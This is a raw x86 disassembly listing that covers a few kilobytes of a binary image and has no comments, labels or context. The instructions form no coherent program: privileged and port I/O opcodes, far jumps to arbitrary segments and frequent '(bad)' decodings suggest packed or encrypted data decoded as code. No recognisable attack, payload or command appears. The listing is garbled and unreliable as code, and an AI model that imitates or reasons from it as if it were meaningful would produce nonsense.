  40927e:	mov    edx,0x39252eb8
  409283:	xchg   edi,eax
  409284:	push   ebx
  409285:	sub    BYTE PTR [eax+0x680c6744],dl
  40928b:	mov    edi,0xabc4aa3e
  409290:	cdq    
  409291:	dec    esp
  409292:	and    esp,DWORD PTR [esi-0x7d]
  409295:	add    eax,0x9876bbfa
  40929a:	test   DWORD PTR [edx+ebx*2],ecx
  40929d:	or     dl,BYTE PTR [ecx+ecx*1]
  4092a0:	or     eax,0xb8be8c6e
  4092a5:	adc    ch,BYTE PTR [eax-0x57a52c01]
  4092ab:	lock mov dh,0xd2
  4092ae:	and    bl,BYTE PTR [edi-0x6a]
  4092b1:	lods   eax,DWORD PTR ds:[esi]
  4092b2:	pop    ecx
  4092b3:	sub    DWORD PTR [edx-0x3a],esp
  4092b6:	sub    al,BYTE PTR [ebp-0x73]
  4092b9:	bound  ebx,QWORD PTR [edx+ebp*8-0x277152d6]
  4092c0:	int    0xb7
  4092c2:	xchg   edx,eax
  4092c3:	in     al,0x2f
  4092c5:	jno    0x409280
  4092c7:	jl     0x4092fd
  4092c9:	rsm    
  4092cb:	mov    ah,0xaa
  4092cd:	xchg   edx,eax
  4092ce:	adc    DWORD PTR [eax-0x13eaf295],esi
  4092d4:	test   BYTE PTR [ebp-0x44f97c11],bl
  4092da:	dec    esi
  4092db:	je     0x409281
  4092dd:	adc    BYTE PTR [ecx+0x8],dl
  4092e0:	pop    edx
  4092e1:	jb     0x4092d4
  4092e3:	nop
  4092e4:	cmp    ch,bh
  4092e6:	pop    esp
  4092e7:	mov    bh,0xb6
  4092e9:	mov    edx,0xadd75251
  4092ee:	pop    esp
  4092ef:	or     BYTE PTR [eax+0x420b9a8a],al
  4092f5:	(bad)  
  4092f6:	les    eax,FWORD PTR ds:0xc1d1dd08
  4092fc:	scas   eax,DWORD PTR es:[edi]
  4092fd:	cwde   
  4092fe:	nop
  4092ff:	das    
  409300:	jl     0x409377
  409302:	ds pop ebx
  409304:	jl     0x40930a
  409306:	xchg   BYTE PTR [edx],bl
  409308:	retf   0x60a3
  40930b:	pop    ss
  40930c:	pop    es
  40930d:	sbb    dl,BYTE PTR [esi+ebp*1+0x25cb955e]
  409314:	push   0xffffffb1
  409316:	add    DWORD PTR [eax],edx
  409318:	fucomip st,st(2)
  40931a:	xlat   BYTE PTR ds:[ebx]
  40931b:	xchg   edx,eax
  40931c:	sbb    DWORD PTR [edi-0x4f494c94],eax
  409322:	imul   eax,DWORD PTR [ebx-0x5f],0x779f4d46
  409329:	inc    esi
  40932a:	imul   ebx,edx,0x6b
  40932d:	mov    ecx,0xe64011df
  409332:	cmp    edi,DWORD PTR [edi+eiz*1]
  409335:	nop
  409336:	enter  0x23ad,0x20
  40933a:	jg     0x409387
  40933c:	adc    eax,0x8fdc2e9b
  409341:	mov    ds:0xf20217a4,eax
  409346:	test   cl,al
  409348:	adc    eax,0x9edaadd0
  40934d:	and    BYTE PTR [edi+eax*8-0x26],ah
  409351:	loop   0x409395
  409353:	gs jne 0x48e7e7e4
  40935a:	mov    BYTE PTR [ebx+0x61],dh
  40935d:	mov    dh,0xf7
  40935f:	inc    eax
  409360:	cmp    BYTE PTR [esi],ah
  409362:	aas    
  409363:	jnp    0x40933a
  409365:	xchg   BYTE PTR [ebx],ah
  409367:	xchg   esi,eax
  409368:	sti    
  409369:	loop   0x409308
  40936b:	jbe    0x4093d4
  40936d:	loope  0x409352
  40936f:	retf   0x4018
  409372:	inc    ecx
  409373:	mov    al,al
  409375:	bound  ebx,QWORD PTR [eax+eiz*4+0x7ff6544d]
  40937c:	fld    TBYTE PTR [ecx+0x6a]
  40937f:	and    eax,0x610e3ce0
  409384:	fld    st(5)
  409386:	mov    dl,0x72
  409388:	lahf   
  409389:	and    cl,al
  40938b:	scas   al,BYTE PTR es:[edi]
  40938c:	ror    BYTE PTR [ebx-0x21],cl
  40938f:	aas    
  409390:	mov    bl,0x3
  409392:	and    ah,0xfc
  409395:	mov    ecx,0xc935caea
  40939a:	sub    ecx,esp
  40939c:	lea    esp,[ecx]
  40939e:	lahf   
  40939f:	mov    ch,0x6b
  4093a1:	lahf   
  4093a2:	sub    eax,0x795a96e
  4093a7:	popa   
  4093a8:	xor    DWORD PTR [edi+0x24],eax
  4093ab:	mov    dl,0xc8
  4093ad:	xor    DWORD PTR [eax+eax*2-0x51b7cdc5],ebp
  4093b4:	sub    esp,DWORD PTR [eax]
  4093b6:	pop    ebx
  4093b7:	mov    BYTE PTR es:[ebx+0x1f],bh
  4093bb:	cmp    esi,ebp
  4093bd:	cs jae 0x409375
  4093c0:	(bad)  
  4093c1:	pusha  
  4093c2:	enter  0x9e70,0xd2
  4093c6:	in     al,0x30
  4093c8:	pusha  
  4093c9:	test   eax,0xa305bbf3
  4093ce:	in     al,dx
  4093cf:	js     0x4093c8
  4093d1:	pop    esi
  4093d2:	or     al,0xa7
  4093d4:	scas   eax,DWORD PTR es:[edi]
  4093d5:	cmc    
  4093d6:	sbb    ch,BYTE PTR [esi-0x4e]
  4093d9:	stos   DWORD PTR es:[edi],eax
  4093da:	jno    0x409413
  4093dc:	and    BYTE PTR [eax],bh
  4093de:	rol    edx,1
  4093e0:	xchg   DWORD PTR [eax],esp
  4093e2:	inc    edx
  4093e3:	adc    BYTE PTR [ebx-0x5f5236fb],ch
  4093e9:	cmp    eax,0xeb331f0a
  4093ee:	mov    WORD PTR [ecx],gs
  4093f0:	inc    ebp
  4093f1:	push   ebx
  4093f2:	or     eax,0x1696ac27
  4093f7:	add    edx,DWORD PTR [edx+0x58]
  4093fa:	je     0x409432
  4093fc:	adc    DWORD PTR [eax+ecx*4+0x3],edi
  409400:	sbb    BYTE PTR [ebp-0x5e],ch
  409403:	ins    BYTE PTR es:[edi],dx
  409404:	ja     0x40941a
  409406:	add    DWORD PTR ds:0x2ed776f7,eax
  40940c:	test   al,0x64
  40940e:	es mov esp,0x55d0e074
  409414:	pop    ss
  409415:	xchg   esi,eax
  409416:	imul   ebp,DWORD PTR [eax+ecx*1],0xe4c55dc2
  40941d:	nop
  40941e:	mov    edi,0x2f0f41bd
  409423:	push   eax
  409424:	nop
  409425:	sub    eax,0xcb91b654
  40942a:	mov    edi,0xa22d42d
  40942f:	add    ebp,esi
  409431:	ror    DWORD PTR [ebp+0x5a044354],0x2c
  409438:	jmp    0x6be7c5a2
  40943d:	in     al,dx
  40943e:	xlat   BYTE PTR ds:[ebx]
  40943f:	(bad)  
  409440:	fxch   st(0)
  409442:	pop    eax
  409443:	lds    ebx,FWORD PTR [edi]
  409445:	xchg   edx,eax
  409446:	inc    esi
  409447:	sar    dh,0xaa
  40944a:	xchg   edx,eax
  40944b:	push   0x64
  40944d:	pop    edx
  40944e:	push   cs
  40944f:	mov    esi,0x27c1817a
  409454:	dec    ebx
  409455:	gs and eax,0x8d5789d7
  40945b:	in     eax,dx
  40945c:	add    bh,bh
  40945e:	or     DWORD PTR [edx+eax*4+0x66],0x453d5b8c
  409466:	int3   
  409467:	mov    WORD PTR [eax+0x64],?
  40946a:	outs   dx,DWORD PTR ds:[esi]
  40946b:	cmp    al,0x27
  40946d:	and    al,al
  40946f:	cmp    DWORD PTR [ebx-0x66d46d9e],ebp
  409475:	js     0x409482
  409477:	mov    WORD PTR ds:0xffc79190,fs
  40947d:	dec    ebp
  40947e:	or     BYTE PTR [ebp-0x36792f3d],dl
  409484:	add    ecx,DWORD PTR [edi]
  409486:	mov    ds:0xc2637921,eax
  40948b:	(bad)  
  40948c:	lods   eax,DWORD PTR ds:[esi]
  40948d:	mov    eax,0xd51110eb
  409492:	jae    0x4094e6
  409494:	fstp   DWORD PTR [esi]
  409496:	shl    BYTE PTR [ecx+0x15385386],cl
  40949c:	(bad)  
  40949e:	jle    0x409455
  4094a0:	inc    ebp
  4094a1:	rcr    DWORD PTR [ebp-0x5c],1
  4094a4:	sbb    BYTE PTR [edx-0x1d],ch
  4094a7:	(bad)  
  4094a8:	xor    BYTE PTR [esi-0x16e68907],dh
  4094ae:	fidiv  DWORD PTR [ebx+esi*2]
  4094b1:	jae    0x4094de
  4094b3:	test   al,0xd3
  4094b5:	std    
  4094b6:	cmp    ebx,ebx
  4094b8:	dec    edx
  4094b9:	stos   BYTE PTR es:[edi],al
  4094ba:	sbb    sp,WORD PTR [ecx+0x3992342c]
  4094c1:	das    
  4094c2:	pop    edi
  4094c3:	or     al,BYTE PTR [ecx+0x6a]
  4094c6:	call   0xa035345f
  4094cb:	mov    esp,0x4a766214
  4094d0:	retf   0xe77e
  4094d3:	cs jb  0x40946f
  4094d6:	cli    
  4094d7:	test   eax,0x2f275042
  4094dc:	test   DWORD PTR [ecx],ebx
  4094de:	outs   dx,BYTE PTR ds:[esi]
  4094df:	nop
  4094e0:	out    dx,al
  4094e1:	xchg   ecx,eax
  4094e2:	bts    DWORD PTR [ebx+0xb8eb7c2],0xce
  4094ea:	out    0xf1,eax
  4094ec:	outs   dx,DWORD PTR ds:[esi]
  4094ed:	(bad)  
  4094ee:	leave  
  4094ef:	cmp    dl,bl
  4094f1:	push   eax
  4094f2:	addr16 repz aam 0x1
  4094f6:	aam    0xc2
  4094f8:	push   ebx
  4094f9:	sub    al,0x50
  4094fb:	dec    eax
  4094fc:	push   edi
  4094fd:	not    ch
  4094ff:	pop    edi
  409500:	jne    0x409532
  409502:	cmp    BYTE PTR [edi],0x61
  409505:	xor    DWORD PTR [ecx-0x59],ecx
  409508:	mov    eax,0xdca9c250
  40950d:	mov    edx,0x9adf0003
  409512:	cmp    BYTE PTR ds:0x467cc18d,cl
  409518:	call   0xf26d:0xe1abedac
  40951f:	lods   eax,DWORD PTR ds:[esi]
  409520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409521:	sub    al,bh
  409523:	xchg   edx,eax
  409524:	push   ebp
  409525:	test   eax,0x89bde31b
  40952a:	jmp    0x409569
  40952c:	stos   DWORD PTR es:[edi],eax
  40952d:	cdq    
  40952e:	int    0x4a
  409530:	imul   esi,DWORD PTR [ebp-0x3d6aa65],0x30
  409537:	imul   esi,DWORD PTR [esp+ecx*8],0x14ba8dd6
  40953e:	(bad)  
  40953f:	push   esp
  409540:	fild   QWORD PTR [ebx+0x48]
  409543:	(bad)  
  409544:	cli    
  409545:	lea    ecx,[ecx+eiz*1+0x4a39a198]
  40954c:	repz popa 
  40954e:	es stos DWORD PTR es:[edi],eax
  409550:	popa   
  409551:	jecxz  0x409574
  409553:	jnp    0x4094df
  409555:	call   DWORD PTR [eax+0x48]
  409558:	mov    ch,0xa1
  40955a:	mov    al,ds:0xdb0aeac9
  40955f:	mov    ebx,0xa1f0d5c7
  409564:	(bad)  
  409566:	mov    al,ds:0x9be35cd1
  40956b:	enter  0x9e7f,0x89
  40956f:	sub    eax,0xe257b492
  409574:	shl    bl,0x6c
  409577:	mov    ds:0x7ddb8f45,al
  40957c:	mov    ah,0x66
  40957e:	push   edx
  40957f:	mov    ch,0x7e
  409581:	sbb    dh,bh
  409583:	out    0x7d,al
  409585:	mov    bl,0xeb
  409587:	mov    bl,0xd7
  409589:	dec    esi
  40958a:	pinsrw mm7,edi,0xe5
  40958e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40958f:	dec    esp
  409590:	xor    esp,DWORD PTR [eax-0x4f]
  409593:	mov    ebp,0x9889198a
  409598:	mov    ch,0x3f
  40959a:	neg    esp
  40959c:	retf   0x27b6
  40959f:	inc    ebp
  4095a0:	cdq    
  4095a1:	xchg   BYTE PTR [edx+0x58f86143],bh
  4095a7:	jge    0x4095d3
  4095a9:	pop    edi
  4095aa:	xor    ebp,edx
  4095ac:	push   ds
  4095ad:	mov    bl,0x83
  4095af:	xor    eax,DWORD PTR [edi+0x7dffc67d]
  4095b5:	dec    eax
  4095b6:	jle    0x409631
  4095b8:	outs   dx,BYTE PTR ds:[esi]
  4095b9:	dec    edi
  4095ba:	addr16 xchg edi,eax
  4095bc:	retf   0x3592
  4095bf:	jne    0x40959a
  4095c1:	stc    
  4095c2:	dec    edx
  4095c3:	inc    ebp
  4095c4:	cs clc 
  4095c6:	xor    ah,BYTE PTR [esi]
  4095c8:	dec    BYTE PTR [eax-0x79]
  4095cb:	inc    eax
  4095cc:	es ins DWORD PTR es:[edi],dx
  4095ce:	fsubp  st(0),st
  4095d0:	pop    esi
  4095d1:	fs adc eax,0xd6bb1806
  4095d7:	jl     0x409615
  4095d9:	test   al,0x4f
  4095db:	inc    edx
  4095dc:	xchg   ebx,eax
  4095dd:	push   ss
  4095de:	bound  edi,QWORD PTR [ecx+0x1]
  4095e1:	mov    BYTE PTR [ecx-0x36],cl
  4095e4:	mov    edi,0x3df00ff8
  4095e9:	out    0x44,al
  4095eb:	dec    edx
  4095ec:	clc    
  4095ed:	jmp    di
  4095f0:	(bad)  
  4095f2:	mov    edx,0x3c2f3d01
  4095f7:	aam    0x78
  4095f9:	call   0x24be:0x15362cf0
  409600:	push   ebp
  409601:	dec    edi
  409602:	push   0x51
  409604:	mov    al,ds:0x231b5ea2
  409609:	int    0xd2
  40960b:	imul   ecx,DWORD PTR [esi-0x2a],0xfffffff9
  40960f:	add    esp,edx
  409611:	inc    esi
  409612:	jl     0x4095d1
  409614:	scas   eax,DWORD PTR es:[edi]
  409615:	nop
  409616:	lea    ebp,[ecx]
  409618:	sbb    DWORD PTR [edx+edx*2-0x28],ebp
  40961c:	out    dx,eax
  40961d:	ds test al,0xa4
  409620:	dec    ebp
  409621:	mov    WORD PTR [ecx],?
  409623:	sbb    DWORD PTR [ebx-0x27],edi
  409626:	lahf   
  409627:	jns    0x4096a8
  409629:	cs xor al,0x7b
  40962c:	jmp    0x40967e
  40962e:	ret    
  40962f:	pop    ebp
  409630:	pushf  
  409631:	and    eax,0xd1ace5b5
  409636:	mov    eax,ds:0xc79bf20e
  40963b:	push   ebp
  40963c:	lock cld 
  40963e:	in     eax,0xcc
  409640:	sbb    eax,0xdb7bf8d0
  409645:	sub    esi,ebx
  409647:	sti    
  409648:	push   es
  409649:	nop
  40964a:	daa    
  40964b:	xchg   ebp,eax
  40964c:	sbb    BYTE PTR [esi+0x26c82ee5],dl
  409652:	loope  0x409687
  409654:	jb     0x40963d
  409656:	test   al,0xcb
  409658:	ret    0xf6ef
  40965b:	adc    BYTE PTR [ecx-0x1b79a2d5],bh
  409661:	pop    ds
  409662:	mov    eax,ds:0xce9050c9
  409667:	sub    al,al
  409669:	sub    esi,DWORD PTR [edi]
  40966b:	dec    ebp
  40966c:	iret   
  40966d:	dec    edi
  40966e:	jne    0x409691
  409670:	popf   
  409671:	jp     0x409675
  409673:	xor    DWORD PTR [edx-0x73ac22ff],0x1a
  40967a:	pop    eax
  40967b:	xchg   edi,eax
  40967c:	scas   al,BYTE PTR es:[edi]
  40967d:	sbb    ah,BYTE PTR ds:0x422c31dc
  409683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409684:	imul   ecx,ebp,0xc
  409687:	test   ebx,eax
  409689:	jae    0x40960f
  40968b:	push   esi
  40968c:	jle    0x4096ee
  40968e:	xchg   edx,eax
  40968f:	pop    edx
  409690:	sbb    al,0x30
  409692:	xor    al,0xf1
  409694:	inc    ebx
  409695:	or     BYTE PTR [ecx],bl
  409697:	add    DWORD PTR [eax],ecx
  409699:	pushf  
  40969a:	(bad)  
  40969b:	imul   ecx,DWORD PTR [ecx],0x70
  40969e:	xor    eax,DWORD PTR [edx+eiz*4]
  4096a1:	icebp  
  4096a2:	lahf   
  4096a3:	mov    DWORD PTR ds:0xbd69a78a,ebp
  4096a9:	imul   edi,DWORD PTR [ecx-0x5c],0x4a
  4096ad:	int3   
  4096ae:	mov    BYTE PTR [edx],ah
  4096b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096b1:	sbb    ebp,DWORD PTR [ebp-0x42]
  4096b4:	mov    esi,0x8ca137ed
  4096b9:	fneni(8087 only) 
  4096bb:	pop    ecx
  4096bc:	cmp    al,0xdb
  4096be:	adc    esi,DWORD PTR [edi]
  4096c0:	dec    ebp
  4096c1:	retf   
  4096c2:	test   BYTE PTR [ebp+ebx*2+0x309bc41e],cl
  4096c9:	mov    esi,0x4c345570
  4096ce:	jmp    0xc8902dca
  4096d3:	bound  ebp,QWORD PTR [edx-0x51]
  4096d6:	mov    bh,0xe1
  4096d8:	fiadd  DWORD PTR [edx+0x73]
  4096db:	and    DWORD PTR [edi+0x58371af6],eax
  4096e1:	cld    
  4096e2:	or     eax,0xf96ede7d
  4096e7:	xlat   BYTE PTR ds:[ebx]
  4096e8:	stos   BYTE PTR es:[edi],al
  4096e9:	or     eax,0x448c93e4
  4096ee:	mov    bl,0x4
  4096f0:	jmp    0x92c06445
  4096f5:	pop    eax
  4096f6:	xor    edx,eax
  4096f8:	jo     0x4096e1
  4096fa:	xchg   edi,eax
  4096fb:	or     ebp,DWORD PTR cs:[edi+0x1f07ebbe]
  409702:	dec    edx
  409703:	cs aas 
  409705:	jp     0x40974a
  409707:	pusha  
  409708:	data16 fcom QWORD PTR [ebp-0x2f]
  40970c:	aas    
  40970d:	mov    ecx,0x86c29990
  409712:	mov    ch,0xe
  409714:	sbb    BYTE PTR [edi+eax*8],0x70
  409718:	pop    ds
  409719:	call   0xb53f:0x58e17d32
  409720:	(bad)  
  409721:	shl    BYTE PTR [edi-0x8],1
  409724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409725:	pusha  
  409726:	add    DWORD PTR [ecx+ecx*1+0x75322c],edi
  40972d:	mov    ecx,0xaf7b8242
  409732:	adc    eax,0x2fd7ec47
  409737:	push   esp
  409738:	cmp    al,0x2d
  40973a:	sbb    eax,0x700d8584
  40973f:	lahf   
  409740:	fiadd  DWORD PTR [edx+eax*4+0x59]
  409744:	mov    ecx,0x5a09e04b
  409749:	mov    edx,0x62ef9802
  40974e:	xor    esi,DWORD PTR [ecx-0x1f]
  409751:	jno    0x40972a
  409753:	adc    BYTE PTR [ebx-0x2],bh
  409756:	pop    edi
  409757:	adc    dh,BYTE PTR [esi]
  409759:	xchg   ebp,eax
  40975a:	mov    ah,0x5d
  40975c:	add    bl,BYTE PTR [esi]
  40975e:	(bad)  
  40975f:	fldenv [ebp+0x5280a078]
  409765:	xchg   DWORD PTR [eax+0x7e],edx
  409768:	(bad)  
  409769:	mov    ch,0xde
  40976b:	popa   
  40976c:	cmp    eax,DWORD PTR [ebp-0x6d7fe7e2]
  409772:	das    
  409773:	ret    0x3cd1
  409776:	(bad)  
  409777:	xor    esi,DWORD PTR [ebx-0x7f1473f]
  40977d:	push   ecx
  40977e:	es nop
  409780:	addr16 cdq 
  409782:	inc    edi
  409783:	xor    DWORD PTR [eax-0x11d9d4fe],0xffffffe7
  40978a:	lahf   
  40978b:	je     0x4097cc
  40978d:	pop    ecx
  40978e:	mov    dl,0x78
  409790:	popf   
  409791:	fstp   QWORD PTR [edx+0x43]
  409794:	out    0xf2,al
  409796:	pop    esi
  409797:	popf   
  409798:	and    al,0xf7
  40979a:	cmc    
  40979b:	adc    WORD PTR [ebp-0x52],sp
  40979f:	push   esi
  4097a0:	adc    ebp,ecx
  4097a2:	adc    al,0x56
  4097a4:	push   eax
  4097a5:	hlt    
  4097a6:	pop    esi
  4097a7:	mov    edx,?
  4097a9:	jns    0x409783
  4097ab:	push   ecx
  4097ac:	jbe    0x409794
  4097ae:	cmp    DWORD PTR [ecx],esi
  4097b0:	xchg   esp,eax
  4097b1:	repz push eax
  4097b3:	adc    bh,BYTE PTR [ebx]
  4097b5:	mov    ds:0x5666dc8a,al
  4097ba:	iret   
  4097bb:	push   ecx
  4097bc:	push   ds
  4097bd:	xor    al,0x70
  4097bf:	dec    esi
  4097c0:	shr    DWORD PTR [ebp-0x65],0xf6
  4097c4:	cwde   
  4097c5:	call   0xe08e:0x52e9bfe7
  4097cc:	out    0x37,al
  4097ce:	rol    dl,cl
  4097d0:	ins    BYTE PTR es:[edi],dx
  4097d1:	xchg   edi,eax
  4097d2:	jb     0x409808
  4097d4:	pop    es
  4097d5:	fs stos DWORD PTR es:[edi],eax
  4097d7:	call   0x82e4:0xe2eb1f08
  4097de:	jbe    0x4097ef
  4097e0:	mov    al,bl
  4097e2:	pushf  
  4097e3:	mov    es,WORD PTR [ebx-0x24]
  4097e6:	adc    edi,ebp
  4097e8:	sahf   
  4097e9:	xchg   edi,eax
  4097ea:	add    DWORD PTR [eax],eax
  4097ec:	rcr    BYTE PTR [ecx-0x45],0xa8
  4097f0:	scas   al,BYTE PTR es:[edi]
  4097f1:	xchg   esi,eax
  4097f2:	xchg   edi,eax
  4097f3:	not    BYTE PTR ds:[ecx-0x27]
  4097f7:	inc    esi
  4097f8:	aaa    
  4097f9:	idiv   DWORD PTR [edx]
  4097fb:	jnp    0x409817
  4097fd:	xchg   edi,eax
  4097fe:	mov    eax,0x373bcafc
  409803:	mov    esi,0x2a60dbce
  409808:	hlt    
  409809:	and    cl,al
  40980b:	xor    eax,0x50742ac2
  409810:	dec    eax
  409811:	test   BYTE PTR fs:[edx],dl
  409814:	inc    eax
  409815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409816:	rcl    edi,0x72
  409819:	sbb    eax,0xb70f460b
  40981e:	fwait
  40981f:	dec    esp
  409820:	dec    edx
  409821:	fwait
  409822:	out    dx,al
  409823:	sub    cl,bh
  409825:	pop    edx
  409826:	adc    BYTE PTR ds:0x68607563,ch
  40982c:	mov    cl,0x5d
  40982e:	sub    ebp,esi
  409830:	lahf   
  409831:	mov    esi,DWORD PTR [esi-0x29abac84]
  409837:	(bad)  
  40983b:	mov    ebp,0x9f7fefdd
  409840:	call   0x12a4b499
  409845:	ror    DWORD PTR [eax+0x5f],1
  409848:	daa    
  409849:	lock xor ah,dl
  40984c:	scas   eax,DWORD PTR es:[edi]
  40984d:	cmp    ebx,edi
  40984f:	test   eax,0xf648ef22
  409854:	lahf   
  409855:	mov    eax,0x3e63377d
  40985a:	fidiv  WORD PTR [edi-0x66]
  40985d:	inc    esi
  40985e:	and    al,0xd8
  409860:	outs   dx,BYTE PTR ds:[esi]
  409861:	sbb    ch,BYTE PTR [ecx-0x41]
  409864:	adc    DWORD PTR [ebx],ebp
  409866:	xadd   edx,eax
  409869:	dec    ebp
  40986a:	adc    dh,ch
  40986c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40986d:	jae    0x40981c
  40986f:	dec    ecx
  409870:	and    BYTE PTR [edx+ebx*2],0xac
  409874:	popa   
  409875:	repz sahf 
  409877:	cld    
  409878:	ins    BYTE PTR es:[edi],dx
  409879:	jg     0x409878
  40987b:	addr16 xchg ebp,eax
  40987d:	(bad)
  409880:	xor    al,0x78
  409882:	pop    ds
  409883:	fwait
  409884:	and    BYTE PTR ds:0xfbefd8eb,al
  40988a:	ss push edx
  40988c:	jmp    0xf010:0x940de9f9
  409893:	cmp    BYTE PTR [esi+ebx*1-0x4cec4d68],al
  40989a:	jecxz  0x40986e
  40989c:	das    
  40989d:	dec    edx
  40989e:	dec    ebp
  40989f:	xchg   edi,eax
  4098a0:	aad    0x51
  4098a2:	jno    0x40988d
  4098a4:	cmp    al,ch
  4098a6:	pop    edx
  4098a7:	cdq    
  4098a8:	jecxz  0x4098a9
  4098aa:	xchg   ecx,eax
  4098ab:	out    dx,al
  4098ac:	push   eax
  4098ad:	xchg   ebx,eax
  4098ae:	push   es
  4098af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b0:	xor    ebp,DWORD PTR [edx-0x21]
  4098b3:	outs   dx,DWORD PTR ds:[esi]
  4098b4:	push   esi
  4098b5:	sub    cl,ch
  4098b7:	add    BYTE PTR [ecx],dh
  4098b9:	sbb    DWORD PTR [edx+eax*1-0x6a2a36c4],esp
  4098c0:	pop    esp
  4098c1:	hlt    
  4098c2:	push   0x68b9a7b7
  4098c7:	xchg   esi,eax
  4098c8:	(bad)  
  4098c9:	sbb    ebx,DWORD PTR [edx+0x5eab6f82]
  4098cf:	ret    
  4098d0:	lock dec ecx
  4098d2:	ins    DWORD PTR es:[edi],dx
  4098d3:	sbb    esp,edi
  4098d5:	jae    0x4098d6
  4098d7:	and    eax,0x58ff95de
  4098dc:	daa    
  4098dd:	ins    BYTE PTR es:[edi],dx
  4098de:	fdiv   DWORD PTR [ebx-0x4e]
  4098e1:	mov    ch,0x66
  4098e3:	mov    ah,dl
  4098e5:	ret    
  4098e6:	jmp    0x40994c
  4098e8:	stc    
  4098e9:	jle    0x4098a7
  4098eb:	mov    cl,BYTE PTR [esi]
  4098ed:	je     0x4098e3
  4098ef:	xchg   ebx,eax
  4098f0:	push   edi
  4098f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f2:	dec    ebp
  4098f3:	loopne 0x409919
  4098f5:	pop    ebp
  4098f6:	push   es
  4098f7:	jmp    0x409909
  4098f9:	retf   
  4098fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098fb:	cmp    al,0x57
  4098fd:	(bad)  
  4098fe:	loopne 0x4098dc
  409900:	fiadd  DWORD PTR [ecx]
  409902:	jae    0x4098e1
  409904:	test   DWORD PTR [ebx+0x50],ebx
  409907:	cld    
  409908:	(bad)  
  409909:	pop    esi
  40990a:	enter  0x255a,0x1d
  40990e:	out    dx,al
  40990f:	es popa 
  409911:	add    BYTE PTR [edi],bl
  409913:	(bad)  [edx-0x570f6050]
  409919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40991a:	cdq    
  40991b:	cmp    ebx,DWORD PTR [eax-0x22]
  40991e:	push   eax
  40991f:	mov    esi,0x9fcff50a
  409924:	dec    esp
  409925:	adc    BYTE PTR [ebx+0x28],ah
  409928:	lock cs xchg esp,eax
  40992b:	fsub   DWORD PTR [esi-0x2f]
  40992e:	or     dh,BYTE PTR [eax-0x59879a0e]
  409934:	jmp    0xa10d:0x86ce5b52
  40993b:	cmp    DWORD PTR [ebp+0x5b],0xffffffeb
  40993f:	aad    0x39
  409941:	cmp    dl,BYTE PTR [ecx]
  409943:	je     0x409998
  409945:	out    0xd0,al
  409947:	in     al,dx
  409948:	push   0x58d3266e
  40994d:	sti    
  40994e:	and    DWORD PTR [ebx-0x29],esi
  409951:	sahf   
  409952:	repz and eax,0x413fa415
  409958:	pop    edi
  409959:	fild   DWORD PTR [ecx+eax*4-0x25f16d4d]
  409960:	outs   dx,BYTE PTR ds:[esi]
  409961:	cmp    cl,dh
  409963:	sub    al,0x41
  409965:	jp     0x4099b5
  409967:	daa    
  409968:	lods   al,BYTE PTR ds:[esi]
  409969:	mov    al,BYTE PTR [edx+0x1727010f]
  40996f:	adc    eax,0x7753acdb
  409974:	cmp    al,0x7
  409976:	mov    ch,0x31
  409978:	xor    al,0xe3
  40997a:	aad    0x6f
  40997c:	adc    eax,0x26a5f0f9
  409981:	dec    esp
  409982:	push   edi
  409983:	mov    dl,0x96
  409985:	dec    esp
  409986:	sbb    eax,0x82ced20
  40998b:	out    dx,al
  40998c:	mov    ds:0xc4bafdd,eax
  409991:	inc    esi
  409992:	ror    DWORD PTR [ebx],0xfc
  409995:	push   ebp
  409996:	rcl    ebx,cl
  409998:	sub    esp,DWORD PTR [esi+0x57d9e706]
  40999e:	add    DWORD PTR ds:0xf111d5e5,esp
  4099a4:	stc    
  4099a5:	in     eax,dx
  4099a6:	add    edx,DWORD PTR [edx]
  4099a8:	cdq    
  4099a9:	ins    BYTE PTR es:[edi],dx
  4099aa:	dec    esp
  4099ab:	pop    edi
  4099ac:	mov    ds:0xf88a93a1,al
  4099b1:	cmp    BYTE PTR [ebp-0x2f],al
  4099b4:	cs xchg esp,eax
  4099b6:	mov    edi,0xbbdf7bfd
  4099bb:	xor    al,dh
  4099bd:	test   BYTE PTR ds:0xa6c5bff7,dl
  4099c3:	cmp    BYTE PTR [edx+ebx*4],bl
  4099c6:	cmp    eax,0xe563ddf7
  4099cb:	xor    al,0xce
  4099cd:	xchg   BYTE PTR [ebx],bh
  4099cf:	out    0xa8,al
  4099d1:	loope  0x40996b
  4099d3:	jmp    0x4a0f4a39
  4099d8:	pushf  
  4099d9:	add    cl,0x93
  4099dc:	mov    eax,0x1b24e52f
  4099e1:	mov    ah,0x4d
  4099e3:	add    al,0x1a
  4099e5:	imul   BYTE PTR [edi]
  4099e7:	cwde   
  4099e8:	push   ss
  4099e9:	cmp    ebx,DWORD PTR [ebp-0x1f33b44d]
  4099ef:	jmp    0x409a46
  4099f1:	sbb    BYTE PTR [edx-0x28],dh
  4099f4:	lods   al,BYTE PTR ds:[esi]
  4099f5:	(bad)  
  4099f6:	sub    dh,BYTE PTR [esp+edi*2-0x62e40fb7]
  4099fd:	cmc    
  4099fe:	mov    dh,0x38
  409a00:	mov    al,ds:0x99f57022
  409a05:	xlat   BYTE PTR ds:[ebx]
  409a06:	push   edx
  409a07:	aas    
  409a08:	dec    ebx
  409a09:	mov    DWORD PTR [edi+0x6187e244],edi
  409a0f:	cmp    ecx,DWORD PTR [esi+0x6fad97e6]
  409a15:	dec    edx
  409a16:	adc    ebx,DWORD PTR ds:0xaccad1a1
  409a1c:	sahf   
  409a1d:	shr    cl,cl
  409a1f:	sub    ah,BYTE PTR [esi+0x3f]
  409a22:	mov    al,ds:0x76be5d3e
  409a27:	sub    esi,esp
  409a29:	lea    edi,[esi+esi*2-0x33768383]
  409a30:	imul   esi,DWORD PTR [ebp+0xd22e1e1],0xffffff89
  409a37:	retf   0x4c0
  409a3a:	jmp    0x4441:0x66703ddd
  409a41:	pop    ss
  409a42:	es jae 0x409a10
  409a45:	test   BYTE PTR [edx-0x4e],ah
  409a48:	add    eax,0x57499b75
  409a4d:	jmp    0x89419cf3
  409a52:	(bad)  
  409a53:	jns    0x409a17
